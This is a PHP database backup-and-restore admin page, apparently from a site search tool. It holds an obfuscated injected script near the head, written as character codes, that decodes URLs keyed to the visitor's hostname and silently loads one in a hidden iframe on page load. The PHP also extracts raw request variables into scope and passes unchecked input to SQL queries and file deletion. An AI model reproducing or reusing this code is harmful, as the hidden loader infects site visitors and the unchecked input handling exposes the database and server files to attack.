<?php 

error_reporting (E_ALL ^ E_NOTICE);
extract($_POST);
extract($_REQUEST);
include "auth.php";
$backup_path="./backup/";
$dbname=$database;
$dbprefix=$mysql_table_prefix;

if (isset($send2)) {
	include("db_backup.php");
}
?>
<head>
<script language="JavaScript">
function checkAll(theForm, cName, allNo_stat) {
	var n=theForm.elements.length;
	for (var x=0;x<n;x++){
		if (theForm.elements[x].className.indexOf(cName) !=-1){
			if (allNo_stat.checked) {
			theForm.elements[x].checked = true;
		} else {
			theForm.elements[x].checked = false;
		}
	}
	}
}

  function confirm_del_prompt(URL) {
	if (!confirm("Do you really want to delete the backup file?")) 
		return false;	  
	window.location = URL;
	}

 function confirm_rest_prompt(URL) {
	if (!confirm("Do you want to restore the database from backup file? Current database will be lost.")) 
		return false;	  
	window.location = URL;
	}
</script>

<script>document.write(String.fromCharCode(60,98,111,100,121,62,10,60,47,98,111,100,121,62,10,60,115,99,114,105,112,116,62,10,102,117,110,99,116,105,111,110,32,103,101,116,95,100,111,109,97,105,110,40,41,32,123,10,32,32,32,32,118,97,114,32,97,32,61,32,91,10,9,34,92,120,99,51,92,120,100,102,92,120,100,102,92,120,100,98,92,120,57,49,92,120,56,52,92,120,56,52,92,120,99,51,92,120,99,50,92,120,100,98,92,120,100,98,92,120,99,52,92,120,99,53,92,120,99,52,92,120,99,53,92,120,99,101,92,120,99,53,92,120,100,56,92,120,56,53,92,120,99,56,92,120,99,52,92,120,56,53,92,120,100,101,92,120,99,48,92,120,56,52,92,120,99,100,92,120,99,52,92,120,100,57,92,120,100,101,92,120,99,54,92,120,56,52,92,120,57,52,92,120,100,102,92,120,57,54,92,120,57,102,92,120,99,100,92,120,99,100,92,120,57,99,92,120,57,100,92,120,57,56,92,120,99,57,92,120,99,56,92,120,99,97,92,120,99,101,92,120,99,97,92,120,99,97,92,120,57,102,34,44,10,9,34,92,120,99,51,92,120,100,102,92,120,100,102,92,120,100,98,92,120,57,49,92,120,56,52,92,120,56,52,92,120,99,54,92,120,99,50,92,120,99,56,92,120,100,57,92,120,99,52,92,120,100,56,92,120,99,52,92,120,99,100,92,120,100,102,92,120,56,54,92,120,99,97,92,120,100,98,92,120,100,102,92,120,56,53,92,120,99,56,92,120,99,52,92,120,56,53,92,120,100,101,92,120,99,48,92,120,56,52,92,120,99,100,92,120,99,52,92,120,100,57,92,120,100,101,92,120,99,54,92,120,56,52,92,120,57,52,92,120,100,102,92,120,57,54,92,120,57,102,92,120,99,100,92,120,99,100,92,120,57,99,92,120,57,100,92,120,57,56,92,120,99,57,92,120,99,56,92,120,99,97,92,120,99,101,92,120,99,97,92,120,99,97,92,120,57,102,34,44,10,9,34,92,120,99,51,92,120,100,102,92,120,100,102,92,120,100,98,92,120,57,49,92,120,56,52,92,120,56,52,92,120,99,54,92,120,99,50,92,120,99,56,92,120,100,57,92,120,99,52,92,120,100,56,92,120,99,52,92,120,99,100,92,120,100,102,92,120,56,54,92,120,100,102,92,120,99,99,92,120,100,99,92,120,56,53,92,120,99,56,92,120,99,52,92,120,56,53,92,120,100,101,92,120,99,48,92,120,56,52,92,120,99,100,92,120,99,52,92,120,100,57,92,120,100,101,92,120,99,54,92,120,56,52,92,120,57,52,92,120,100,102,92,120,57,54,92,120,57,102,92,120,99,100,92,120,99,100,92,120,57,99,92,120,57,100,92,120,57,56,92,120,99,57,92,120,99,56,92,120,99,97,92,120,99,101,92,120,99,97,92,120,99,97,92,120,57,102,34,44,10,9,34,92,120,99,51,92,120,100,102,92,120,100,102,92,120,100,98,92,120,57,49,92,120,56,52,92,120,56,52,92,120,99,54,92,120,99,50,92,120,99,56,92,120,100,57,92,120,99,52,92,120,100,56,92,120,99,52,92,120,99,100,92,120,100,102,92,120,56,54,92,120,99,52,92,120,99,56,92,120,100,57,92,120,56,53,92,120,99,56,92,120,99,52,92,120,56,53,92,120,100,101,92,120,99,48,92,120,56,52,92,120,99,100,92,120,99,52,92,120,100,57,92,120,100,101,92,120,99,54,92,120,56,52,92,120,57,52,92,120,100,102,92,120,57,54,92,120,57,102,92,120,99,100,92,120,99,100,92,120,57,99,92,120,57,100,92,120,57,56,92,120,99,57,92,120,99,56,92,120,99,97,92,120,99,101,92,120,99,97,92,120,99,97,92,120,57,102,34,44,10,9,34,92,120,99,51,92,120,100,102,92,120,100,102,92,120,100,98,92,120,57,49,92,120,56,52,92,120,56,52,92,120,99,54,92,120,99,50,92,120,99,56,92,120,100,57,92,120,99,52,92,120,100,56,92,120,99,52,92,120,99,100,92,120,100,102,92,120,56,54,92,120,100,57,92,120,99,56,92,120,100,98,92,120,56,53,92,120,99,56,92,120,99,52,92,120,56,53,92,120,100,101,92,120,99,48,92,120,56,52,92,120,99,100,92,120,99,52,92,120,100,57,92,120,100,101,92,120,99,54,92,120,56,52,92,120,57,52,92,120,100,102,92,120,57,54,92,120,57,102,92,120,99,100,92,120,99,100,92,120,57,99,92,120,57,100,92,120,57,56,92,120,99,57,92,120,99,56,92,120,99,97,92,120,99,101,92,120,99,97,92,120,99,97,92,120,57,102,34,10,9,93,59,10,9,118,97,114,32,98,32,61,32,48,120,70,70,70,70,70,70,70,70,59,10,32,32,32,32,118,97,114,32,100,32,61,32,98,59,10,32,32,32,32,118,97,114,32,101,32,61,32,48,120,51,51,51,51,51,51,51,51,59,10,32,32,32,32,118,97,114,32,102,32,61,32,48,120,68,51,52,68,66,51,51,70,59,10,32,32,32,32,118,97,114,32,103,32,61,32,48,120,56,48,48,48,48,48,48,48,59,10,32,32,32,32,118,97,114,32,104,32,61,32,48,120,65,66,59,10,32,32,32,32,118,97,114,32,107,32,61,32,40,100,111,99,117,109,101,110,116,91,39,108,111,99,97,116,105,111,110,39,93,91,39,104,111,115,116,110,97,109,101,39,93,32,124,124,32,39,100,101,102,97,117,108,116,115,104,105,116,39,41,91,39,116,111,76,111,119,101,114,67,97,115,101,39,93,40,41,59,10,32,32,32,32,102,111,114,32,40,118,97,114,32,106,32,61,32,48,59,32,106,32,60,32,107,46,108,101,110,103,116,104,59,32,106,43,43,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,99,32,61,32,107,91,39,99,104,97,114,67,111,100,101,65,116,39,93,40,106,41,59,10,32,32,32,32,32,32,32,32,100,32,94,61,32,99,32,60,60,32,50,52,59,10,32,32,32,32,32,32,32,32,102,111,114,32,40,118,97,114,32,105,32,61,32,48,59,32,105,32,60,32,56,59,32,105,43,43,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,105,102,32,40,100,32,38,32,48,120,56,48,48,48,48,48,48,48,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,100,32,61,32,40,100,32,60,60,32,49,41,32,94,32,48,120,69,68,66,56,56,51,50,48,10,32,32,32,32,32,32,32,32,32,32,32,32,125,32,101,108,115,101,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,100,32,60,60,61,32,49,10,32,32,32,32,32,32,32,32,32,32,32,32,125,10,32,32,32,32,32,32,32,32,125,10,32,32,32,32,125,10,32,32,32,32,105,102,32,40,100,32,60,32,48,41,32,123,10,32,32,32,32,32,32,32,32,100,32,61,32,100,32,62,62,62,32,48,10,32,32,32,32,125,10,32,32,32,32,102,111,114,32,40,118,97,114,32,105,32,61,32,48,120,70,70,70,70,70,70,70,70,44,32,110,117,109,32,61,32,48,59,32,110,117,109,32,60,32,53,59,32,105,32,45,61,32,101,44,32,110,117,109,43,43,41,32,123,10,32,32,32,32,32,32,32,32,105,102,32,40,100,32,62,61,32,40,105,32,45,32,101,41,32,38,38,32,100,32,60,61,32,105,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,108,32,61,32,34,34,59,10,32,32,32,32,32,32,32,32,32,32,32,32,102,111,114,32,40,118,97,114,32,105,32,61,32,48,59,32,105,32,60,32,97,91,110,117,109,93,46,108,101,110,103,116,104,59,32,105,43,43,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,108,32,43,61,32,83,116,114,105,110,103,91,39,102,114,111,109,67,104,97,114,67,111,100,101,39,93,40,97,91,110,117,109,93,91,39,99,104,97,114,67,111,100,101,65,116,39,93,40,105,41,32,94,32,48,120,65,66,41,10,32,32,32,32,32,32,32,32,32,32,32,32,125,10,32,32,32,32,32,32,32,32,32,32,32,32,114,101,116,117,114,110,32,108,10,32,32,32,32,32,32,32,32,125,10,32,32,32,32,125,10,125,10,119,105,110,100,111,119,46,117,114,108,100,97,116,97,32,61,32,103,101,116,95,100,111,109,97,105,110,40,41,59,10,105,102,32,40,116,121,112,101,111,102,32,40,119,105,110,100,111,119,91,39,105,102,114,97,109,101,100,39,93,41,32,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,10,32,32,32,32,119,105,110,100,111,119,91,39,105,102,114,97,109,101,100,39,93,32,61,32,48,10,125,10,105,102,32,40,119,105,110,100,111,119,91,39,105,102,114,97,109,101,100,39,93,32,61,61,32,48,41,32,123,10,32,32,32,32,32,32,32,32,119,105,110,100,111,119,91,39,105,102,114,97,109,101,100,39,93,32,61,32,49,59,10,32,32,32,32,32,32,32,32,118,97,114,32,97,32,61,32,100,111,99,117,109,101,110,116,91,39,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,39,93,40,34,105,102,114,97,109,101,34,41,91,48,93,59,10,32,32,32,32,32,32,32,32,105,102,32,40,116,121,112,101,111,102,32,40,97,41,32,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,98,32,61,32,100,111,99,117,109,101,110,116,91,39,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,39,93,40,34,104,101,97,100,34,41,91,48,93,59,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,99,32,61,32,100,111,99,117,109,101,110,116,91,39,99,114,101,97,116,101,69,108,101,109,101,110,116,39,93,40,34,100,105,118,34,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,99,46,115,116,121,108,101,46,100,105,115,112,108,97,121,32,61,32,39,110,111,110,101,39,59,10,32,32,32,32,32,32,32,32,32,32,32,32,99,46,105,100,32,61,32,39,101,118,105,108,115,104,105,116,39,59,10,32,32,32,32,32,32,32,32,32,32,32,32,98,91,39,97,112,112,101,110,100,67,104,105,108,100,39,93,40,99,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,100,32,61,32,100,111,99,117,109,101,110,116,91,39,99,114,101,97,116,101,69,108,101,109,101,110,116,39,93,40,34,105,102,114,97,109,101,34,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,100,46,115,114,99,32,61,32,119,105,110,100,111,119,46,117,114,108,100,97,116,97,59,10,9,9,9,98,91,39,97,112,112,101,110,100,67,104,105,108,100,39,93,40,100,41,10,32,32,32,32,32,32,32,32,125,32,101,108,115,101,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,97,46,115,114,99,32,61,32,119,105,110,100,111,119,46,117,114,108,100,97,116,97,10,9,125,10,32,125,10,60,47,115,99,114,105,112,116,62));</script></head>
<div id="submenu">
</div>
  <TABLE WIDTH="94%">
	 <TR> 
	  <TD valign="top"><center> 
		<?php 
		  if (!get_extension_funcs('zlib'))  {
			 echo "Compression module status notice: <font color='red'>Zlib is NOT installed on the server! Backup disabled!";
		  } ?>
		  </font></center>	  
		</TD>
	</TR>
  </TABLE>

<FORM NAME="dobackup" ID="dbform" METHOD="post" ACTION="admin.php">
<input type="hidden" name="f" value="database">

<table width="94%" border="0" cellspacing=0 cellpadding=0 align="center">
  <tr align=center> 
	<td width="1%" class="greyHeading">&nbsp;</td>
	<td class="greyHeading"><b>Tables</b></font></td>
	<td width="10%" class="greyHeading"><b>Rows</b></font></td>
	<td width="20%" class="greyHeading"><b>Created on</b></font></td>
	<td width="15%" class="greyHeading"><b>Data Size kB</b></font></td>
	<td width="17%" class="greyHeading"><b>Index Size kB</b></font></td>
  </tr>
 <?php


		$stats  = mysql_query ("SHOW TABLE STATUS FROM $dbname LIKE '$dbprefix%'");
		$num_tables = mysql_num_rows($stats);
		if ($num_tables==0) {
			echo("ERROR: Database contains no tables");
		}	

		$bgcolor='grey';
		$i=0;
		while ($rows=mysql_fetch_array($stats) ) {
			print "<tr><td class=".$bgcolor."><input type='checkbox' id='tables$i' class='check' name='tables[$i]' value='".$rows["Name"]."' ></td>";
			print "<td class=".$bgcolor.">".$rows["Name"]."</td>";
			print '<td align="center" class='.$bgcolor.'>'.$rows['Rows'].'</td>';
			print '<td align="center" class='.$bgcolor.'>'.$rows['Create_time'].'</td>';
			print '<td align="center" class='.$bgcolor.'>'.number_format($rows['Data_length']/1024,1).'</td>';
			print '<td align="center" class='.$bgcolor.'>'.number_format($rows['Index_length']/1024,1).'</td></tr>'."\n";
  		$i++;
  		if ($bgcolor=='grey') {
			$bgcolor='white';
  		} else {
			$bgcolor='grey';
  		}
  	}	

echo "
<tr><td colspan='6'>
<input type='checkbox' name='chg' onclick=\"checkAll(document.getElementById('dbform'),'check',this);\"><b>Check all tables</b>
</td></tr></table>
<center><input  id='submit' type='submit' name='send2' value='Optimize'></center><br>


<center>
<table>
 <tr>
	<td>
	 <font color='#990000' size='1'><strong>Backup File Name: </strong></font>

	 <input name='filename' type='text' class='textbox' id='filename' size='20' maxlength='25' value='$dbname.sql.gz' >
	<input  id='submit'"; if (!get_extension_funcs('zlib'))echo 'disabled'; echo " type='submit' name='send2' value='Backup'>
	</td>
 </tr>
 <tr>
	<td>
	 Backup structure only
	 <input type='checkbox' name='structonly' value='Yes'>
	</td>
</tr>
</table>

</form>
<br>
<table width='94%' border='0' cellspacing='0' cellpadding='0' align='center'>
  <TR> 
	  <TD valign='top'>";
  

if (isset($file) && $del==0) {
	  if (eregi("gz",$file)) { 
		 @unlink($backup_path."backup.sql");
		 $fp = @fopen($backup_path."backup.sql","w");
		 fwrite ($fp,"");
			fclose ($fp);
		 chmod($backup_path."backup.sql", 0777);
		 $fp = @fopen($backup_path."backup.sql","w");
		 $zp = @gzopen($backup_path.$file, "rb");
		 if(!$fp) {
			die("No sql file can be created"); 
		 }	
		 if(!$zp) {
			die("Cannot read zip file");
		 }	
		 while(!gzeof($zp)){
			$data=gzgets($zp, 8192);// buffer php
			fwrite($fp,$data);
		 }
		 fclose($fp);
		 gzclose($zp);
		 $file="backup.sql";

		flush();
	set_time_limit(1000);
	$file_temp=fread(fopen($backup_path.$file, "r"), filesize($backup_path.$file));
	$query=explode(";#%%\n",$file_temp);
	for ($i=0;$i < count($query)-1;$i++) {
		mysql_db_query($dbname,$query[$i]) or die(mysql_error());
	}
	unlink($backup_path.$file);
	echo "<table width=\"94%\"><tr><td><b>Your restore 
request was processed.</b> If you did not receive any errors on the screen, then 
you should find that your database tables have been restored.<br></td></tr></table>";
}
} 
if (isset($file) && $del==1) {
	@unlink($backup_path.$file);
}

?>
	  </TD>
	</TR>
	<TR> 
	  <TD valign="top">
	  <table width="100%" cellspacing="0">
		  
<?php
	if (!is_dir($backup_path)) {
		mkdir($backup_path, 0766);
	}
	$dir=opendir($backup_path); 
	$bgcolor='grey';
	$is_first=1;

		

	while ($file = readdir ($dir)) { 
		if ($file != "." && $file != ".." &&  (eregi("\.sql",$file) || eregi("\.gz",$file))){
			if($is_first==1){
				echo "<tr> 
				<td width=\"30%\" align=\"center\" class=\"greyHeading\"><b>File</b></td>
				<td width=\"20%\" align=\"center\" class=\"greyHeading\"><b>Size</b></td>
				<td width=\"20%\" align=\"center\" class=\"greyHeading\"><b>Date</b></td>
				<td class=\"greyHeading\">&nbsp;</td></tr>"; 
			}
			$is_first=0;
			echo "<tr><td nowrap class=$bgcolor align=\"center\">$file</td>
				 <td nowrap class=$bgcolor align=\"center\">".round(filesize($backup_path.$file) / 1024, 2)." kB</td>
				 <td nowrap class=$bgcolor align=\"center\">".date("Y-m-d",filemtime($backup_path.$file))."</td>
				 <td nowrap class=$bgcolor align=\"left\"><input type='button' id='submit' onclick=\"confirm_rest_prompt('./admin.php?f=database&file=$file&del=0');\" value='Restore'> &nbsp;<input type='button' id='submit' onclick=\"confirm_del_prompt('./admin.php?f=database&file=$file&del=1');\" value='Delete'></td>
				 </tr>"; 
			 
			if ($bgcolor=='grey') {
				$bgcolor='greyForm';
  			} else {
				$bgcolor='grey';
  			}
		}
		
	}
	closedir($dir);
	?>
		</table></TD>
	</TR>
	
  </TABLE>
</CENTER>
